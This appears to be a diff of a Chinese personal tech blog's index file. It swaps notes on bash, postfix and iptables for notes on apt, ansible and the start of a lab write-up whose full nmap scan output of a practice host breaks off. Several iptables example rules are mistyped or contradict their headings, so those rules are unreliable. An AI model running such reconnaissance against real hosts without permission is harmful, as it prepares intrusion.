-<p>指定输出位置,则输出到指定位置: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF &gt;&gt; doc.txt</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">root@Divint3:~<span class="comment"># cat doc.txt </span></span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure></p>
-<p>bash中使用&gt;&lt;|时 -用作占位符</p>
-<p><code>set -C</code>:阻止覆盖重定向 强制覆盖输出 <code>&gt;|</code> <code>set +C</code>:取消阻止覆盖重定向重定向</p>
-<p>tee: 既能保证输出可以输出到标准输出(屏幕),也能保证输出到文件中.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Divint3:~# echo &quot;echo&quot; | tee &#x2F;tmp&#x2F;a</span><br><span class="line">echo</span><br><span class="line">root@Divint3:~# cat &#x2F;tmp&#x2F;a</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
-<h4 id="重定向所有输出标准输出以及标准错误输出">重定向所有输出(标准输出以及标准错误输出)</h4>
-<p><code>ls &gt; /dev/null 2&gt;&amp;1</code></p>
-<hr />
-<h2 id="bash编程">bash编程</h2>
-<h3 id="流程控制">流程控制</h3>
-<h4 id="分支结构">分支结构</h4>
-<h5 id="多行if结构">多行if结构</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<h5 id="单行if结构">单行if结构</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">"ssh"</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">"true"</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<h5 id="if-else">if else</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<h5 id="if-elif-else">if elif else</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<h5 id="case">case</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> 值 <span class="keyword">in</span></span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
-<h4 id="循环结构">循环结构</h4>
-<h5 id="for循环">for循环</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ...;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h5 id="while循环">while循环</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h5 id="until循环">until循环</h5>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">until condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h4 id="跳出循环">跳出循环</h4>
-<p><strong>continue</strong>：跳出本次循环进行下一次循环</p>
-<p><strong>break</strong>：跳出循环</p>
-<hr />
-<h3 id="基本运算符">基本运算符</h3>
-<h4 id="布尔运算符">布尔运算符</h4>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">运算符</th>
-<th style="text-align: center;">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">！</td>
-<td style="text-align: center;">非运算</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-o</td>
-<td style="text-align: center;">或运算</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-a</td>
-<td style="text-align: center;">与运算</td>
-</tr>
-</tbody>
-</table>
-<h4 id="关系运算符">关系运算符</h4>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">运算符</th>
-<th style="text-align: center;">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">-eq</td>
-<td style="text-align: center;">相等返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-ne</td>
-<td style="text-align: center;">不相等返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-gt</td>
-<td style="text-align: center;">大于返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-lt</td>
-<td style="text-align: center;">小于返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-ge</td>
-<td style="text-align: center;">大于等于返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-le</td>
-<td style="text-align: center;">小于等于返回true</td>
-</tr>
-</tbody>
-</table>
-<h4 id="字符串运算符">字符串运算符</h4>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">运算符</th>
-<th style="text-align: center;">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">=</td>
-<td style="text-align: center;">字符串相等返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">!=</td>
-<td style="text-align: center;">字符串不相等返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-z</td>
-<td style="text-align: center;">字符串长度为0返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-n</td>
-<td style="text-align: center;">字符串长度不为0返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">$</td>
-<td style="text-align: center;">字符串不为空返回true</td>
-</tr>
-</tbody>
-</table>
-<h4 id="文件测试运算符">文件测试运算符</h4>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">运算符</th>
-<th style="text-align: center;">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">-b</td>
-<td style="text-align: center;">是块设备文件返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-c</td>
-<td style="text-align: center;">是字符设备文件返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-d</td>
-<td style="text-align: center;">是文件夹返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-f</td>
-<td style="text-align: center;">是普通文件返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-g</td>
-<td style="text-align: center;">设置了sgid位返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-k</td>
-<td style="text-align: center;">设置了粘滞位返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-p</td>
-<td style="text-align: center;">是有名管道文件返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-u</td>
-<td style="text-align: center;">设置了suid位返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-r</td>
-<td style="text-align: center;">是可读文件返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-w</td>
-<td style="text-align: center;">是可写文件返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-x</td>
-<td style="text-align: center;">是可执行文件返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-s</td>
-<td style="text-align: center;">是空文件返回true</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">-e</td>
-<td style="text-align: center;">文件/文件夹存在返回true</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">-L</td>
-<td style="text-align: center;">文件存在链接返回true</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="函数">函数</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;function&gt; funname()&#123;</span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="bash检查语法以及查看执行过程">bash检查语法以及查看执行过程</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -n   test.bash   <span class="comment">#查看bash是否存在语法错误</span></span><br><span class="line">bash -x   test.bash   <span class="comment">#查看bash详细的执行过程</span></span><br></pre></td></tr></table></figure>
-<hr />
-<h3 id="信号">信号</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP</span><br><span class="line"> 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1</span><br><span class="line">11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM</span><br><span class="line">16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP</span><br><span class="line">21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ</span><br><span class="line">26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR</span><br><span class="line">31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3</span><br><span class="line">38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</span><br><span class="line">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</span><br><span class="line">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7</span><br><span class="line">58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-1  64) SIGRTMAX</span><br></pre></td></tr></table></figure>
-<p><strong>Ctrl+c：sigint</strong>=<strong>kill -2</strong></p>
-<h3 id="trap信号捕捉">trap信号捕捉</h3>
-<p><code>trap</code>是不能捕捉sigkill信号的，kill -9 发送sigkill信号，程序必定停止运行</p>
-<h3 id="read读变量">read读变量</h3>
-<hr />
-<h3 id="脚本使用选项">脚本使用选项</h3>
-<h4 id="getopts">getopts</h4>
-<p>内置变量<strong>$OPTARG</strong>，用于接收选项参数</p>
-<p>选项索引<strong>$OPTIND</strong></p>
-<p>获得最后的参数<code>shift ${$OPTIND-1}</code></p>
+    <title>apt-各种参数详解</title>
+    <url>/apt-%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="apt软件包管理器">apt软件包管理器</h3>
+<p><a href="https://mritd.me/2015/12/06/apt-get%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">apt-get常用命令</a></p>
+<h4 id="安装升级删除">安装升级删除:</h4>
+<h5 id="查看软件xxx安装内容">查看软件xxx安装内容</h5>
+<p>dpkg -L xxx 查找软件库中的软件 <code>apt-cache search 正则表达式</code> 或 <code>aptitude search 软件包</code></p>
+<h5 id="显示系统安装包的统计信息">显示系统安装包的统计信息</h5>
+<p><code>apt-cache stats</code></p>
+<h5 id="显示系统全部可用包的名称">显示系统全部可用包的名称</h5>
+<p><code>apt-cache pkgnames</code></p>
+<h5 id="显示包的信息">显示包的信息</h5>
+<p><code>apt-cache show k3b</code></p>
+<h5 id="查找文件属于哪个包">查找文件属于哪个包</h5>
+<p><code>apt-file search filename</code></p>
+<h5 id="查看已经安装了哪些包">查看已经安装了哪些包</h5>
+<p><code>dpkg -l</code></p>
+<h5 id="查询软件xxx依赖哪些包">查询软件xxx依赖哪些包</h5>
+<p><code>apt-cache depends xxx</code></p>
+<h5 id="查询软件xxx被哪些包依赖">查询软件xxx被哪些包依赖</h5>
+<p><code>apt-cache rdepends xxx</code></p>
+<h5 id="增加一个光盘源">增加一个光盘源</h5>
+<p>sudo apt-cdrom add</p>
+<h5 id="系统升级">系统升级</h5>
+<p><code>sudo apt-get update</code> (这一步更新包列表)</p>
+<p><code>sudo apt-get dist-upgrade</code> (这一步安装所有可用更新) 或者 <code>sudo apt-get upgrade</code> (这一步安装应用程序更新，不安装新内核等)</p>
+<h5 id="编译时缺少h文件的自动处理">编译时缺少h文件的自动处理</h5>
+<p><code>sudo auto-apt run ./configure</code></p>
+<h5 id="查看安装软件时下载包的临时存放目录">查看安装软件时下载包的临时存放目录</h5>
+<p><code>ls /var/cache/apt/archives</code></p>
+<h5 id="备份当前系统安装的所有包的列表">备份当前系统安装的所有包的列表</h5>
+<p><code>dpkg --get-selections | grep -v deinstall &gt; ~/somefile</code></p>
+<h5 id="从上面备份的安装包的列表文件恢复所有包">从上面备份的安装包的列表文件恢复所有包</h5>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg --set-selections &lt; ~&#x2F;somefile </span><br><span class="line">sudo dselect</span><br></pre></td></tr></table></figure>
+<h5 id="清理旧版本的软件缓存">清理旧版本的软件缓存</h5>
+<p><code>sudo apt-get autoclean</code></p>
+<h5 id="清理所有软件缓存">清理所有软件缓存</h5>
+<p><code>sudo apt-get clean</code></p>
+<h5 id="删除系统不再使用的孤立软件">删除系统不再使用的孤立软件</h5>
+<p><code>sudo apt-get autoremove</code></p>
+<h5 id="purge参数彻底删除文件">purge参数彻底删除文件:</h5>
+<p><code>sudo apt-get purge virtualbox</code> <code>sudo apt-get autoremove</code> <code>sudo apt-get clean</code></p>
+<h5 id="只是删除软件的链接并不实际删除软件的配置文件和实体文件">只是删除软件的链接，并不实际删除软件的配置文件和实体文件。</h5>
+<p><code>apt-get remove</code></p>
+<h5 id="清除所有已删除包的残余配置文件配置文件">清除所有已删除包的残余配置文件配置文件</h5>
+<p><code>dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P</code></p>
+<h6 id="如果报如下错误证明你的系统中没有残留配置文件了无须担心">如果报如下错误，证明你的系统中没有残留配置文件了，无须担心。</h6>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg: --purge needs at least one package name argument </span><br><span class="line"></span><br><span class="line">Type dpkg --help for help about installing and deinstalling packages</span><br><span class="line">;</span><br><span class="line">Use &#39;dselect&#39; or &#39;aptitude&#39; for user-friendly package management; </span><br><span class="line">Type dpkg -Dhelp for a list of dpkg debug flag values; </span><br><span class="line">Type dpkg --force-help for a list of forcing options; </span><br><span class="line">Type dpkg-deb --help for help about manipulating *.deb files; </span><br><span class="line">Type dpkg --license for copyright license and lack of warranty (GNU GPL)</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">Options marked</span><br><span class="line">produce a lot of output - pipe it through &#39;less&#39; or &#39;more&#39; !</span><br></pre></td></tr></table></figure>
+<h5 id="查看包在服务器上面的地址">查看包在服务器上面的地址</h5>
+<p><code>apt-get -qq --print-uris install ssh | cut -d\' -f2</code></p>
+<h5 id="彻底删除gnome">彻底删除Gnome</h5>
+<p><code>apt-get --purge remove liborbit2</code></p>
+<h5 id="彻底删除kde">彻底删除KDE</h5>
+<p><code>apt-get --purge remove libqt3-mt libqtcore4</code></p>
+<h5 id="一键安装-lamp-服务">一键安装 LAMP 服务</h5>
+<p><code>sudo tasksel install lamp-server</code></p>
+<h5 id="删除旧内核">删除旧内核</h5>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo aptitude purge ~ilinux-image-.*\(\!&#96;uname -r&#96;\)</span><br></pre></td></tr></table></figure>
+<h5 id="导入ppa源的key值">导入ppa源的key值</h5>
+<p>W: GPG签名验证错误： http://ppa.launchpad.net jaunty Release: 由于没有公钥，下列签名无法进行验证： NO_PUBKEY 5126890CDCC7AFE0 <code>sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 5126890CDCC7AFE0</code> #5126890CDCC7AFE0替换为你需要导入的Key值</p>
+<h5 id="增加一个ppa源">增加一个ppa源</h5>
+<p><code>sudo add-apt-repository ppa:user/ppa-name</code> 使用 ppa 的地址替换 ppa:user/ppa-name</p>
+<h4 id="dpkg-查看软件包依赖">dpkg 查看软件包依赖</h4>
+<p><code>dpkg -I package.deb</code></p>
+<h3 id="dpkg-查看生成文件">dpkg 查看生成文件</h3>
+<p><code>dpkg -L package_name</code></p>
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>linux软件</category>
       </categories>
   </entry>
   <entry>
-    <title>邮件服务相关</title>
-    <url>/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
-    <content><![CDATA[<h3 id="postfix邮件服务器">postfix邮件服务器</h3>
-<p>主流服务器叫做sendmail,由于业务原因,现在的邮件服务器大都使用sendmail软件发送,但是效率很低,所以大家现在更喜欢效率更高的,开源的邮件服务器postfix,但是postfix并没有configure文件,所以需要使用命令生成make文件 <code>make makefiles 参数</code> 生成make文件,在后续指定文件生成位置,在make的时候可以选择</p>
-<h4 id="验证服务框架-cyrus-sasl">验证服务框架 cyrus-sasl</h4>
-<p>默认安装这三个包就可以让postfix支持sasl了!</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyrus-sasl</span><br><span class="line">cyrus-sasl-plain</span><br><span class="line">cyrus-sasl-devel</span><br></pre></td></tr></table></figure>
-<p>　　SASL全称Simple Authentication and Security Layer,是一种用来扩充C/S模式验证能力的机制.在Postfix可以利用SASL来判断用户是否有权使用转发服务,或是辨认谁在使用你的服务器. 　　SASL提供了一个通用的方法为基于连接的协议增加验证支持,也称作sasl框架.</p>
-<p>因为smtp(simple mail transfer protocol)十分简单,没有认证功能,所以需要sasl框架扩充. sasl 验证方式配置文件在<code>/etc/sysconfig/saslauthd</code> Debian系系统的配置文件在<code>/etc/default/saslauthd</code></p>
-<p>服务脚本叫<code>saslauthd</code> #### 鸽子笼 (dovecot) 一个支持多种协议的客户端接收协议软件 支持imap imaps pop3 pop3s 默认启用四种协议 内置sasl,且支持外置sasl框架</p>
+    <title>ansible-笔记</title>
+    <url>/ansible-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="ansible">ansible</h2>
+<h3 id="概念">概念</h3>
+<ol type="1">
+<li>自动化运维服务端</li>
+<li>不需要安装客户端</li>
+<li><img src="/uploads/ansible流程.jpeg" title="fig:" alt="图片" /></li>
+<li>yum install epel-relese -y</li>
+<li>yum install ansible -y</li>
+<li>首先,要先配置ssh免密登录</li>
+<li>ssh-keygen</li>
+<li>一路回车</li>
+<li><code>ssh-copy-id [-i [identity_file]] [user@]machine</code> <a id="more"></a> ### epel 源 扩展源 基本源 在/mnt下</li>
+</ol>
+<p>先配置免密登录</p>
+<ol type="1">
+<li>定义主机清单</li>
+<li><code>ansible -i 配置文件 组名 -m 模块名</code></li>
+<li><code>ansible -i 配置文件 组名 -m 模块名  -a "name=httpd state=latest"</code></li>
+</ol>
 ]]></content>
       <categories>
         <category>运维</category>
       </categories>
   </entry>
   <entry>
-    <title>iptables-笔记</title>
-    <url>/iptables-%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="简单开启22号端口">简单开启22号端口</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A INPUT -j DROP -s 172.0.0.1 -p 22</span><br><span class="line">iptables -t filter -A INPUT -j ACCEPT -s 172.16.0.0&#x2F;16 -d 172.16.100.1 -p tcp --dport 22 </span><br><span class="line">iptables -t filter -A OUTPUT -j ACCEPT -s 172.16.100.7 -d 172.16.0.0&#x2F;16 -p tcp --sport 22</span><br></pre></td></tr></table></figure>
-<h3 id="state模块使用例程">state模块使用例程</h3>
-<h4 id="禁止向外打开新的tcp连接">禁止向外打开新的tcp连接</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -m state --state NEW -p tcp -s 172.16.0.107 -j DROP</span><br><span class="line">iptables -t filter -A INPUT -p tcp --dport 22 -d 172.16.0.107 -j ACCEPT </span><br><span class="line">iptables -t filter -A OUTPUT -p tcp --sport 22 -s 172.16.0.107 -j ACCEPT</span><br></pre></td></tr></table></figure>
-<h4 id="允许ping自己">允许ping自己</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptebles -P INPUT DROP</span><br><span class="line">iptebles -P OUTPUT DROP </span><br><span class="line">iptables -t filter -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED -d 172.16.0.107 -j DROP</span><br><span class="line">iptebles -t filter -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED -s 172.16.0.107 -j ACCEPT</span><br></pre></td></tr></table></figure>
-<h4 id="防止反弹shell">防止反弹shell</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t fliter -A OUTPUT -m state -s 172.16.0.107 --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
-<h3 id="ftp协议的特殊性">ftp协议的特殊性</h3>
-<h4 id="因为ftp很特殊ip_nat_ftp-ip_conntrack_ftp-模块需要先装载">因为ftp很特殊，ip_nat_ftp ip_conntrack_ftp 模块需要先装载</h4>
-<h4 id="配置文件在etcsysconfigiptables-config在iptables_modules后面填上ip_nat_ftp-和-ip_conntrack_ftp-即可因为ip_nat_ftp依赖ip_conntrack_ftp-所以只需要装载ip_nat_ftp">配置文件在/etc/sysconfig/iptables-config,在IPTABLES_MODULES后面填上ip_nat_ftp 和 ip_conntrack_ftp 即可,因为ip_nat_ftp依赖ip_conntrack_ftp 所以只需要装载ip_nat_ftp</h4>
-<h4 id="related-相关性-专为ftp设定">related 相关性 专为FTP设定</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A OUTPUT -p tcp -s 172.16.0.107 -m state --state RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>
-<h4 id="ip_conntrack是很重要的但是高访问的情况下可能会阻断一部分的传入连接">ip_conntrack是很重要的，但是高访问的情况下可能会阻断一部分的传入连接</h4>
-<h4 id="ip_conntrack内核控制旧版内核">ip_conntrack内核控制(旧版内核)</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;netfilter&#x2F;ip_conntrack_[protocol]</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_conntrack_max</span><br></pre></td></tr></table></figure>
-<h4 id="nf_conntrack内核控制">nf_conntrack内核控制</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;netfilter&#x2F;nf_conntrack_[protocol]</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;netfilter&#x2F;nf_conntrack_max</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;nf_conntrack_max</span><br></pre></td></tr></table></figure>
-<h2 id="显式扩展">显式扩展</h2>
-<p>-m state //状态 -m iprange //ip区段 -m multiport //离散端口，最多15个 -m connlimit //最大连接数 -m limit //流量控制 traffic control(流量控制) token bucket filter -m string //匹配字符串 -m recent //定义规则 防止ddos</p>
-<h3 id="设置连接约束">设置连接约束</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP &#x2F;&#x2F;约束最大连接数</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH &#x2F;&#x2F;设置新连接 &#x2F;&#x2F;不会拦截,因为没有目标,但是会更新记录</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW --update --second 300 --hitcount 3 --name SSH -j DROP &#x2F;&#x2F;检查记录是否符合条件</span><br></pre></td></tr></table></figure>
-<pre><code>    --dnat
-    --snat </code></pre>
-<h3 id="j-target-target译作动作">-j target 【target译作动作】</h3>
-<p>-j ACCEPT DROP RESPECT LOG 自定义链 MASQUERADE //ppp拨号，外网地址是动态获取的时候使用</p>
-<h4 id="从主链转发到自定义链">从主链转发到自定义链</h4>
-<p>iptables -A INPUT -j 自定义链</p>
-<h4 id="从自定义链返回主链">从自定义链返回主链</h4>
-<p>iptables -A 自定义链 -j RETURN</p>
-<h3 id="抓包">抓包</h3>
-<pre><code>tcpdump -i 网卡 -nn -X icmp</code></pre>
-<h3 id="对nat表的操作">对nat表的操作</h3>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">SNAT</th>
-<th style="text-align: center;">DNAT</th>
-<th style="text-align: center;">PNAT</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">Source</td>
-<td style="text-align: center;">destination</td>
-<td style="text-align: center;">port</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">源地址转换</td>
-<td style="text-align: center;">目标地址转换</td>
-<td style="text-align: center;">端口地址转换</td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j SNAT --to-source 更换的源地址:端口 </span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j DNAT --to-destination 更换的目标地址:端口</span><br></pre></td></tr></table></figure>
-<h4 id="dmz-区域-非军事化区-服务器使用nat做跳板访问">DMZ 区域 非军事化区 服务器使用nat做跳板访问</h4>
+    <title>靶场59</title>
+    <url>/%E9%9D%B6%E5%9C%BA54/</url>
+    <content><![CDATA[<p>NMAP扫描报告 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [19:55:54] C:130</span></span><br><span class="line">$ nmap 172.17.135.54 -O -sS -A -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-29 19:55 CST</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 19:56 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.54</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)</span><br><span class="line">|_  256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">|_http-title: Jarbas - O Seu Mordomo Virtual!</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.2 - 4.6</span></span><br><span class="line"><span class="string">Network Distance: 3 hops</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 256/tcp)</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   ...</span></span><br><span class="line"><span class="string">2   4.76 ms bogon (192.168.230.30)</span></span><br><span class="line"><span class="string">3   1.59 ms 172.17.135.54</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 39.08 seconds</span></span><br></pre></td></tr></table></figure> 可以看出 